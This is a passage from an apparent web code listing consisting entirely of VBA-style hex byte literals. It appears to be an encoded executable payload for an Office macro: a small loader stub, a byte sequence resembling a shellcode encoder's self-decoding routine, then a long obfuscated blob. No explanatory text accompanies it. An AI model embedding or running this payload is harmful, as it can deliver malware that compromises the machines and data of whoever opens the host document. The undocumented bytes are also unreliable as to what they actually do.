00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H30&amp;HC0&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HB8&amp;H00&amp;H20&amp;H40&amp;H00&amp;HFF&amp;HE0&amp;H90&amp;HFF&amp;H25&amp;H38&amp;H30&amp;H40&amp;H00&amp;H90&amp;H90&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HFF&amp;HFF&amp;HFF&amp;HFF&amp;H00&amp;H00&amp;H00&amp;H00&amp;HFF&amp;HFF&amp;HFF&amp;HFF&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HBE&amp;H38&amp;HFE&amp;H59&amp;H43&amp;HD9&amp;HC0&amp;HD9&amp;H74&amp;H24&amp;HF4&amp;H58&amp;H29&amp;HC9&amp;H66&amp;HB9&amp;H04&amp;H02&amp;H83&amp;HC0&amp;H04&amp;H31&amp;H70&amp;H11&amp;H03&amp;H70&amp;H29&amp;H1C&amp;HAC&amp;H72&amp;H89&amp;H88&amp;H47&amp;H65&amp;H49&amp;H49&amp;H3C&amp;H7A&amp;H79&amp;H2D&amp;H35&amp;HA4&amp;HC6&amp;HF9&amp;H5B&amp;HAE&amp;HB7&amp;HD8&amp;HB9&amp;H69&amp;HB3&amp;HF8&amp;HB5&amp;HD7&amp;H10&amp;HC8&amp;H87&amp;HBE&amp;H57&amp;HB7&amp;HF4&amp;H3D&amp;HEA&amp;H54&amp;H78&amp;HAC&amp;HBC&amp;HA7&amp;H80&amp;H5C&amp;H04&amp;HD4&amp;H7C&amp;H2F&amp;H4C&amp;H3F&amp;HF6&amp;H46&amp;HA5&amp;H9B&amp;HE9&amp;H63&amp;H8C&amp;H77&amp;H91&amp;H3D&amp;H5B&amp;H28&amp;H72&amp;H19&amp;HED&amp;HFA&amp;H67&amp;HF1&amp;H16&amp;H9C&amp;HBB&amp;H49&amp;H20&amp;H2C&amp;H1B&amp;H8B&amp;HAA&amp;H87&amp;H28&amp;H36&amp;H09&amp;H1B&amp;H58&amp;H1C&amp;H09&amp;H65&amp;H3A&amp;H29&amp;H4C&amp;H6E&amp;H6D&amp;HB8&amp;H84&amp;HCE&amp;H76&amp;H39&amp;HF8&amp;H8A&amp;H1A&amp;HC8&amp;H88&amp;H73&amp;HBE&amp;H9D&amp;H63&amp;H42&amp;H3D&amp;H95&amp;HAB&amp;HF0&amp;H89&amp;H7A&amp;H76&amp;H73&amp;H7C&amp;H94&amp;H7D&amp;H77&amp;H91&amp;H5C&amp;HB9&amp;H65&amp;H2F&amp;H9A&amp;HA8&amp;H69&amp;HEE&amp;HE2&amp;HE7&amp;H69&amp;HBB&amp;H5E&amp;HD9&amp;HE8&amp;H0A&amp;HDF&amp;H68&amp;H4A&amp;HC8&amp;H44&amp;H87&amp;H46&amp;H15&amp;HC4&amp;H63&amp;H69&amp;H73&amp;HC6&amp;H61&amp;HDE&amp;H6C&amp;H85&amp;H7B&amp;HAA&amp;H51&amp;HF1&amp;HA9&amp;HED&amp;H6A&amp;HD5&amp;H16&amp;H62&amp;H8C&amp;HCA&amp;H88&amp;HC5&amp;HD7&amp;HA6&amp;H04&amp;HE0&amp;H60&amp;H6E&amp;HBB&amp;H7B&amp;H93&amp;HC3&amp;H1E&amp;H4F&amp;H83&amp;HF4&amp;H29&amp;H71&amp;HDE&amp;H1A&amp;H60&amp;H5C&amp;HCB&amp;H79&amp;H09&amp;H51&amp;H7E&amp;H96&amp;HDA&amp;HEB&amp;H89&amp;H82&amp;H6A&amp;H60&amp;H21&amp;H77&amp;H9A&amp;H85&amp;H60&amp;HBC&amp;H52&amp;HA1&amp;H1A&amp;HAC&amp;H3A&amp;H02&amp;H2E&amp;H54&amp;H89&amp;H13&amp;HEC&amp;H2A&amp;H44&amp;HAE&amp;H27&amp;HDD&amp;HBA&amp;H2A&amp;H9C&amp;H39&amp;HEE&amp;HD7&amp;H59&amp;HBD&amp;H57&amp;H9A&amp;H71&amp;HDA&amp;H4E&amp;HB4&amp;HC7&amp;HF6&amp;HD9&amp;HB5&amp;HFD&amp;HC7&amp;H9F&amp;H44&amp;HAB&amp;H77&amp;H92&amp;H21&amp;HA9&amp;HD7&amp;HD7&amp;H83&amp;H3B&amp;H61&amp;H01&amp;H98&amp;HB4&amp;HE7&amp;HB0&amp;H40&amp;HCF&amp;H1B&amp;HBD&amp;H94&amp;H15&amp;HF6&amp;H33&amp;H91&amp;HA7&amp;H7B&amp;HCF&amp;H4B&amp;H04&amp;H5C&amp;H53&amp;HC8&amp;H4C&amp;H42&amp;H80&amp;H18&amp;H99&amp;H51&amp;HCD&amp;HAF&amp;H28&amp;H69&amp;HE9&amp;HBF&amp;H99&amp;H4F&amp;H21&amp;HCA&amp;HE3&amp;H00&amp;H25&amp;H2E&amp;H1A&amp;H14&amp;HD1&amp;H5A&amp;H4A&amp;H89&amp;H4D&amp;H3E&amp;H7A&amp;H8E&amp;HAA&amp;H86&amp;HCA&amp;HE6&amp;H40&amp;HEB&amp;H0E&amp;H9F&amp;H84&amp;HCD&amp;HE2&amp;H52&amp;H06&amp;HE0&amp;H45&amp;HCF&amp;H8B&amp;H17&amp;H0F&amp;H6A&amp;H02&amp;HFD&amp;HF9&amp;H89&amp;H1D&amp;H16&amp;HA1&amp;H3C&amp;H64&amp;H68&amp;H8A&amp;HA3&amp;HC7&amp;HE2&amp;HDC&amp;H2F&amp;H76&amp;H7F&amp;H5E&amp;H6A&amp;HC1&amp;H7C&amp;H22&amp;H52&amp;H69&amp;H7D&amp;HEC&amp;H75&amp;H4D&amp;H7C&amp;H8E&amp;HB7&amp;HBA&amp;H07&amp;H63&amp;H7D&amp;HBC&amp;H84&amp;H7C&amp;HDF&amp;HC5&amp;H09&amp;HA4&amp;HCB&amp;HF3&amp;H58&amp;HB4&amp;H51&amp;HF2&amp;HF3&amp;HEC&amp;H28&amp;H38&amp;HDE&amp;HE3&amp;H06&amp;H7E&amp;H9E&amp;HB5&amp;HDB&amp;HC8&amp;H58&amp;HB5&amp;HF6&amp;H8E&amp;H3B&amp;HA0&amp;H98&amp;H1F&amp;HD8&amp;H88&amp;HC2&amp;H1E&amp;HA7&amp;HC3&amp;H4F&amp;HB4&amp;H9F&amp;H54&amp;H2A&amp;H96&amp;H10&amp;HF3&amp;HC1&amp;HF5&amp;H55&amp;H39&amp;H6F&amp;H9A&amp;HC7&amp;HAC&amp;HCD&amp;HDC&amp;H03&amp;H6D&amp;H6C&amp;HBD&amp;H79&amp;HFF&amp;H23&amp;H93&amp;H28&amp;HAC&amp;HE4&amp;HC1&amp;H93&amp;H07&amp;HFF&amp;HFE&amp;H0B&amp;H80&amp;HE9&amp;H33&amp;H32&amp;HC5&amp;H80&amp;H86&amp;H03&amp;H3E&amp;HE6&amp;HCF&amp;H36&amp;HC4&amp;H93&amp;HF3&amp;H11&amp;HEB&amp;HD9&amp;HE1&amp;H19&amp;H61&amp;H51&amp;H05&amp;H2B&amp;H57&amp;H0C&amp;H7D&amp;H66&amp;HDC&amp;H4B&amp;H97&amp;H8D&amp;H78&amp;H1D&amp;H68&amp;H6C&amp;H4F&amp;HF2&amp;HED&amp;H5D&amp;HCA&amp;H39&amp;HAD&amp;HDE&amp;H7D&amp;HAD&amp;HED&amp;H9F&amp;H9F&amp;H9F&amp;HD6&amp;H4F&amp;H76&amp;H91&amp;H08&amp;H2F&amp;H35&amp;HCB&amp;H6A&amp;H3C&amp;HCE&amp;H50&amp;H73&amp;H80&amp;HD1&amp;H45&amp;HC9&amp;H8A&amp;H4C&amp;H51&amp;H25&amp;HD0&amp;H30&amp;HCE&amp;H00&amp;HB6&amp;H9A&amp;H51&amp;H91&amp;H5E&amp;H2C&amp;H13&amp;H3C&amp;H94&amp;H6B&amp;H3B&amp;H27&amp;HCE&amp;HDE&amp;HBA&amp;HC3&amp;HF0&amp;HC8&amp;H34&amp;H42&amp;HDD&amp;HF4&amp;H32&amp;HCD&amp;H48&amp;HEB&amp;H35&amp;HEF&amp;HEA&amp;HDE&amp;H4A&amp;H96&amp;H95&amp;H8E&amp;H59&amp;H43&amp;H1C&amp;H72&amp;HD7&amp;H33&amp;H5F&amp;H4D&amp;HCC&amp;H24&amp;H81&amp;H49&amp;H1F&amp;HA8&amp;H5D&amp;HFF&amp;H92&amp;H6A&amp;HF1&amp;H54&amp;H98&amp;HC2&amp;H46&amp;H9E&amp;H0A&amp;HC2&amp;HB3&amp;H20&amp;HC8&amp;H47&amp;H82&amp;HD9&amp;HBD&amp;HD5&amp;HDE&amp;H5F&amp;H10&amp;HE9&amp;HF4&amp;HCA&amp;H68&amp;H71&amp;H31&amp;H84&amp;H61&amp;H4C&amp;HB6&amp;H05&amp;HF1&amp;H08&amp;H40&amp;H37&amp;H09&amp;HD7&amp;H5A&amp;H8B&amp;HAB&amp;H42&amp;H22&amp;HAD&amp;H97&amp;HD6&amp;H61&amp;H45&amp;H75&amp;HDD&amp;HCD&amp;HCB&amp;H1D&amp;HE7&amp;H29&amp;HC7&amp;H41&amp;H4C&amp;HEC&amp;H2E&amp;HAD&amp;HD4&amp;H05&amp;HA3&amp;HB9&amp;HE1&amp;H66&amp;H54&amp;H71&amp;HCD&amp;H4E&amp;H75&amp;HEB&amp;H2C&amp;HCF&amp;H58&amp;HF1&amp;H83&amp;H44&amp;HF6&amp;HBF&amp;HD4&amp;H82&amp;H4E&amp;HD6&amp;H0E&amp;H7B&amp;H39&amp;H72&amp;HF1&amp;H95&amp;HE1&amp;HA3&amp;H89&amp;H16&amp;H42&amp;H6D&amp;HF5&amp;H52&amp;H3D&amp;H6F&amp;H41&amp;HEF&amp;H53&amp;H27&amp;HAD&amp;HED&amp;H23&amp;H01&amp;H90&amp;HB1&amp;H2C&amp;HC6&amp;HD3&amp;H30&amp;HEA&amp;H4B&amp;HD8&amp;HC0&amp;HBA&amp;H15&amp;HAF&amp;HE2&amp;H6A&amp;HB7&amp;HD2&amp;H27&amp;H2C&amp;H7B&amp;H7F&amp;HA1&amp;H0A&amp;HB9&amp;HAA&amp;HC8&amp;H0C&amp;H7A&amp;HAA&amp;HB8&amp;HD9&amp;HA1&amp;H6C&amp;H9D&amp;H34&amp;H0B&amp;H3D&amp;H5A&amp;HE2&amp;HC7&amp;H3C&amp;H2F&amp;H33&amp;HEC&amp;H03&amp;HD1&amp;HDF&amp;HB8&amp;HD8&amp;HE8&amp;H0A&amp;H79&amp;H3C&amp;H34&amp;HD9&amp;H31&amp;HF8&amp;H59&amp;HC2&amp;H8D&amp;H1E&amp;HFE&amp;H2C&amp;H55&amp;HE8&amp;H5D&amp;H47&amp;H2E&amp;HC1&amp;H9D&amp;H1D&amp;HE6&amp;H4D&amp;HFB&amp;H60&amp;HBF&amp;HC7&amp;H05&amp;H9B&amp;H8D&amp;HAA&amp;H68&amp;H68&amp;HC6&amp;HB4&amp;H4D&amp;H63&amp;HD0&amp;H9F&amp;H82&amp;H02&amp;HA0&amp;H8F&amp;H12&amp;HFB&amp;H6A&amp;HD4&amp;H8B&amp;H25&amp;H10&amp;H6B&amp;H9C&amp;H63&amp;HB6&amp;HE0&amp;HDE&amp;HF1&amp;HF6&amp;H9A&amp;H70&amp;H4C&amp;H13&amp;HF9&amp;HA4&amp;HD5&amp;HB0&amp;HFB&amp;HB3&amp;H14&amp;H61&amp;H67&amp;H3D&amp;H9E&amp;HE6&amp;HA4&amp;HD2&amp;H51&amp;H61&amp;HD1&amp;H91&amp;H5A&amp;H64&amp;H7F&amp;H64&amp;H7D&amp;H3A&amp;HF6&amp;H17&amp;HE4&amp;HC3&amp;HF2&amp;HBE&amp;H77&amp;H80&amp;H57&amp;HE9&amp;H92&amp;H8C&amp;H98&amp;H08&amp;HBB&amp;H2D&amp;HFD&amp;HE5&amp;H4B&amp;H15&amp;HB8&amp;H1D&amp;H77&amp;H9F&amp;H13&amp;H74&amp;H11&amp;H42&amp;H35&amp;H9A&amp;H39&amp;H3D&amp;H07&amp;H3C&amp;H9E&amp;HFF&amp;H87&amp;H2E&amp;H76&amp;H75&amp;HA2&amp;H6D&amp;HEA&amp;H56&amp;H1B&amp;H32&amp;HF1&amp;HA6&amp;HD3&amp;HFE&amp;H20&amp;HBB&amp;H00&amp;H47&amp;H3D&amp;H87&amp;H1A&amp;H2F&amp;H43&amp;HDB&amp;H0A&amp;HD8&amp;H55&amp;HFF&amp;H84&amp;H14&amp;H40&amp;H37&amp;H84&amp;H94&amp;H68&amp;H4F&amp;H95&amp;H84&amp;H78&amp;H59&amp;H08&amp;HB2&amp;HF3&amp;H5E&amp;HC1&amp;HDF&amp;HB6&amp;H39&amp;HA5&amp;HAF&amp;H6B&amp;HCF&amp;HFA&amp;H71&amp;H30&amp;HAA&amp;H98&amp;HB6&amp;H22&amp;H21&amp;HB6&amp;H93&amp;H9E&amp;H82&amp;H24&amp;H03&amp;H9F&amp;H07&amp;HD8&amp;HEC&amp;H5B&amp;HCD&amp;HA7&amp;H79&amp;H87&amp;H14&amp;H48&amp;H32&amp;H04&amp;H3F&amp;HE4&amp;HEB&amp;H9C&amp;HA0&amp;H07&amp;H13&amp;H83&amp;HD7&amp;HDF&amp;HD8&amp;H86&amp;HEA&amp;HD8&amp;H1C&amp;H56&amp;H30&amp;H50&amp;HC7&amp;HC9&amp;H95&amp;H61&amp;HEA&amp;HF5&amp;HD7&amp;H0D&amp;H22&amp;HB0&amp;H7D&amp;HCA&amp;HC4&amp;H5A</span><br><span class="line">&amp;H66&amp;H37&amp;HEF&amp;H1F&amp;H35&amp;HA2&amp;H62&amp;HC1&amp;HC6&amp;H8E&amp;HA7&amp;HEA&amp;HEA&amp;H18&amp;H68&amp;H2C&amp;HCE&amp;H91&amp;HA9&amp;H55&amp;H55&amp;H2F&amp;H2D&amp;H02&amp;H5C&amp;HBB&amp;HDF&amp;HE2&amp;H39&amp;HD0&amp;H77&amp;H4D&amp;H44&amp;H4B&amp;H5C&amp;H1A&amp;H49&amp;HA6&amp;H24&amp;H55&amp;H99&amp;H09&amp;HBF&amp;HE4&amp;H79&amp;HD9&amp;HF5&amp;HF6&amp;H61&amp;HBC&amp;H17&amp;H09&amp;H85&amp;HE9&amp;HF8&amp;H16&amp;H2A&amp;H09&amp;HCC&amp;H0D&amp;H05&amp;H58&amp;HD1&amp;HD6&amp;HC4&amp;H56&amp;HD5&amp;H63&amp;H49&amp;HAB&amp;HAC&amp;HD6&amp;H5D&amp;HCA&amp;HFD&amp;H80&amp;HB9&amp;H46&amp;HF8&amp;H5C&amp;H69&amp;HDA&amp;H30&amp;HD8&amp;H79&amp;H35&amp;HB5&amp;HC4&amp;H32&amp;HAF&amp;H10&amp;H65&amp;HB5&amp;HBB&amp;H3C&amp;H33&amp;H70&amp;H1A&amp;H4B&amp;H1A&amp;HE2&amp;H04&amp;H33&amp;HFD&amp;H4C&amp;H72&amp;H41&amp;HE8&amp;HC8&amp;HEE&amp;H66&amp;HB0&amp;H82&amp;H2F&amp;H6F&amp;H62&amp;HF6&amp;HBC&amp;H51&amp;HD5&amp;HE3&amp;H83&amp;H8F&amp;H56&amp;H26&amp;H80&amp;H70&amp;H20&amp;HB3&amp;HFB&amp;H60&amp;H4C&amp;H7C&amp;H86&amp;H1B&amp;H66&amp;H7C&amp;HC4&amp;H84&amp;HA6&amp;H44&amp;HDA&amp;HCD&amp;HAB&amp;HFD&amp;HA6&amp;H11&amp;H9C&amp;HCB&amp;H1E&amp;H5A&amp;H37&amp;H1A&amp;HAC&amp;H94&amp;H9C&amp;H16&amp;H09&amp;H87&amp;HBA&amp;H66&amp;H80&amp;H5A&amp;HE6&amp;HFC&amp;H89&amp;H9D&amp;H84&amp;H33&amp;H58&amp;H67&amp;HBB&amp;H05&amp;H04&amp;HC5&amp;H9C&amp;H99&amp;H51&amp;H92&amp;HB7&amp;HDE&amp;H07&amp;H51&amp;H4F&amp;HE8&amp;HCA&amp;H7D&amp;H61&amp;H44&amp;H69&amp;HA5&amp;HA0&amp;HEB&amp;H42&amp;H22&amp;H8A&amp;H68&amp;H4B&amp;H3A&amp;HC5&amp;H62&amp;H72&amp;H0E&amp;H4A&amp;H55&amp;HFF&amp;HE5&amp;HEF&amp;H2A&amp;H03&amp;H5F&amp;HBC&amp;HD8&amp;H5C&amp;H25&amp;H74&amp;HC1&amp;H3A&amp;HE5&amp;HBC&amp;HC8&amp;H07&amp;H73&amp;HF4&amp;H94&amp;H86&amp;H7C&amp;HA1&amp;H1D&amp;HE9&amp;HA2&amp;HE4&amp;H87&amp;H45&amp;H4A&amp;HCD&amp;HA1&amp;H41&amp;H81&amp;H1A&amp;H60&amp;H21&amp;H0E&amp;HC1&amp;H98&amp;H7E&amp;H16&amp;H88&amp;H53&amp;H87&amp;HC4&amp;H39&amp;HB9&amp;H17&amp;H8D&amp;H8C&amp;H95&amp;HDF&amp;H92&amp;H85&amp;HAC&amp;H07&amp;H9C&amp;H24&amp;H53&amp;H2D&amp;H69&amp;H26&amp;HCD&amp;HB4&amp;HE0&amp;H8F&amp;HE8&amp;H4A&amp;H7F&amp;H56&amp;HFC&amp;H0A&amp;H19&amp;H30&amp;HC5&amp;HB5&amp;H26&amp;HDE&amp;HF9&amp;HCE&amp;H18&amp;H3F&amp;H20&amp;HC1&amp;H5B&amp;H02&amp;H6B&amp;H67&amp;H61&amp;HD4&amp;H5C&amp;H8E&amp;HC4&amp;HD0&amp;H86&amp;HCD&amp;HBB&amp;H5E&amp;H3C&amp;HF6&amp;H79&amp;HA3&amp;HEA&amp;H1C&amp;H3E&amp;HCB&amp;HBA&amp;H59&amp;H72&amp;HC2&amp;H42&amp;H1A&amp;H01&amp;HFF&amp;H69&amp;H7F&amp;HB7&amp;H00&amp;H11&amp;H6A&amp;H50&amp;H8E&amp;H1C&amp;H56&amp;H8D&amp;H05&amp;H6E&amp;H67&amp;HAF&amp;H16&amp;H8B&amp;H81&amp;H11&amp;H29&amp;HD8&amp;HF0&amp;H71&amp;H74&amp;HE4&amp;HC2&amp;HB0&amp;H3A&amp;HC8&amp;H9F&amp;H44&amp;H1F&amp;H49&amp;HCA&amp;HFB&amp;H9A&amp;H50&amp;H40&amp;HFE&amp;HCA&amp;H7C&amp;H05&amp;HB0&amp;H03&amp;HC1&amp;H6D&amp;H1B&amp;HA4&amp;H9F&amp;H5F&amp;HC1&amp;H52&amp;H44&amp;H55&amp;H37&amp;HCC&amp;H41&amp;H68&amp;H80&amp;HC7&amp;H01&amp;H8D&amp;HBC&amp;H9E&amp;H16&amp;H5B&amp;H2A&amp;HFF&amp;H4D&amp;HD3&amp;H69&amp;H6B&amp;HE8&amp;HA9&amp;H12&amp;HD9&amp;H9D&amp;H56&amp;H9F&amp;H5C&amp;H70&amp;HBE&amp;H95&amp;H56&amp;HD9&amp;H1E&amp;H7D&amp;HA2&amp;HC3&amp;HF0&amp;H99&amp;H48&amp;HDB&amp;H74&amp;HA7&amp;H59&amp;HF8&amp;H8C&amp;H46&amp;H1C&amp;HA3&amp;HC8&amp;HBD&amp;H9B&amp;H08&amp;HF3&amp;HE7&amp;HCC&amp;H51&amp;HE2&amp;H5E&amp;H83&amp;H20&amp;HB4&amp;H9B&amp;H43&amp;HB9&amp;H5E&amp;H60&amp;H6B&amp;H22&amp;H98&amp;HA9&amp;H3C&amp;H2B&amp;HBD&amp;HC2&amp;H56&amp;H7F&amp;H2F&amp;H9C&amp;H97&amp;H3F&amp;H36&amp;HEB&amp;H90&amp;HEA&amp;H66&amp;H67&amp;H70&amp;HC5&amp;HA1&amp;H40&amp;H0B&amp;H9A&amp;HBB&amp;H38&amp;HE5&amp;H06&amp;HCA&amp;HC6&amp;H9F&amp;HE7&amp;HC0&amp;H29&amp;H73&amp;H82&amp;H74&amp;HD2&amp;HDD&amp;H95&amp;HED&amp;HDA&amp;H79&amp;H3E&amp;H6A&amp;H6E&amp;H84&amp;H82&amp;H04&amp;HDD&amp;H75&amp;H77&amp;HFB&amp;H72&amp;HA5&amp;HCC&amp;HFB&amp;H17&amp;H2F&amp;H12&amp;H5D&amp;H73&amp;H0D&amp;H1C&amp;HC6&amp;H65&amp;HEC&amp;HDA&amp;HB4&amp;H83&amp;HC9&amp;H5A&amp;H9F&amp;H61&amp;HA5&amp;HE4&amp;HC9&amp;H99&amp;HE1&amp;H45&amp;H71&amp;H93&amp;H72&amp;H1B&amp;H56&amp;HCD&amp;H12&amp;H7B&amp;H89&amp;HD3&amp;H25&amp;H36&amp;H69&amp;HA8&amp;H07&amp;H9A&amp;HF5&amp;H11&amp;HFC&amp;HC6&amp;HAB&amp;H41&amp;H06&amp;H1C&amp;H22&amp;HB6&amp;H32&amp;HD9&amp;H8E&amp;H05&amp;H79&amp;H80&amp;H08&amp;H8C&amp;HA9&amp;H12&amp;H50&amp;H92&amp;HD0&amp;HC2&amp;H2F&amp;H47&amp;HF7&amp;HDB&amp;H1A&amp;HC9&amp;H45&amp;H3A&amp;HE0&amp;H86&amp;H3E&amp;H6F&amp;H04&amp;HAE&amp;HE3&amp;H67&amp;H0A&amp;HDC&amp;HDF&amp;H85&amp;HF9&amp;H7E&amp;HB7&amp;H80&amp;H11&amp;H0F&amp;HE6&amp;H5E&amp;HBD&amp;H47&amp;HDE&amp;H0E&amp;H49&amp;H51&amp;HAE&amp;H64&amp;H88&amp;H01&amp;H99&amp;HF0&amp;H07&amp;HD7&amp;H2D&amp;H5A&amp;HD4&amp;HB9&amp;HAE&amp;H11&amp;H11&amp;H18&amp;HC2&amp;HD7&amp;H46&amp;HA1&amp;H27&amp;H3E&amp;H6E&amp;H71&amp;HB4&amp;HCA&amp;H05&amp;HBD&amp;H4E&amp;HF9&amp;HC9&amp;H95&amp;HEB&amp;H91&amp;H48&amp;H09&amp;H27&amp;H45&amp;H19&amp;H74&amp;H00&amp;H42&amp;H3B&amp;HE6&amp;H8E&amp;HD5&amp;H05&amp;H14&amp;HCE&amp;H9B&amp;H5A&amp;HCE&amp;H34&amp;H2C&amp;H99&amp;HA3&amp;H49&amp;HE1&amp;HEC&amp;HB1&amp;H56&amp;H06&amp;H4E&amp;H0C&amp;H9F&amp;HC2&amp;H0B&amp;H90&amp;H8D&amp;H2C&amp;H41&amp;HAD&amp;H11&amp;HA7&amp;H31&amp;H84&amp;HB0&amp;HCA&amp;H98&amp;HFC&amp;H0E&amp;HAE&amp;HBC&amp;HF0&amp;HFB&amp;H6C&amp;H93&amp;HF7&amp;H86&amp;H2C&amp;H3A&amp;H01&amp;H2F&amp;H9A&amp;HD7&amp;H96&amp;HD3&amp;H71&amp;H9A&amp;HB7&amp;H12&amp;HDE&amp;HA6&amp;H9B&amp;HB6&amp;HAA&amp;HFF&amp;HE3&amp;H1F&amp;H74&amp;H4F&amp;H9C&amp;H12&amp;HB7&amp;H59&amp;HC6&amp;HB5&amp;HD3&amp;H5B&amp;HD4&amp;H13&amp;HF5&amp;HEF&amp;H66&amp;H72&amp;H3C&amp;H95&amp;HB1&amp;H38&amp;H1E&amp;H6D&amp;HC0&amp;H4B&amp;H65&amp;H76&amp;HEE&amp;H5C&amp;HAB&amp;HF5&amp;H89&amp;HEF&amp;HA7&amp;HE7&amp;H26&amp;HF6&amp;H89&amp;HD2&amp;H20&amp;HE5&amp;H0A&amp;H3F&amp;HF1&amp;H16&amp;H36&amp;H9A&amp;H59&amp;H09&amp;HA5&amp;HF4&amp;HA3&amp;H52&amp;H45&amp;H52&amp;H47&amp;HF1&amp;HF7&amp;H68&amp;H5D&amp;HA1&amp;HB2&amp;H30&amp;HB8&amp;H39&amp;H6F&amp;H93&amp;H17&amp;H83&amp;H5B&amp;HB3&amp;H0D&amp;H91&amp;HAA&amp;HC4&amp;HD9&amp;H08&amp;H1E&amp;H3C&amp;H22&amp;HA6&amp;H37&amp;HA2&amp;H48&amp;HF9&amp;H9E&amp;H01&amp;H67&amp;H13&amp;H23&amp;H2D&amp;H82&amp;H7F&amp;H5B&amp;H92&amp;H92&amp;H49&amp;H23&amp;H8C&amp;H7B&amp;H24&amp;H10&amp;H2D&amp;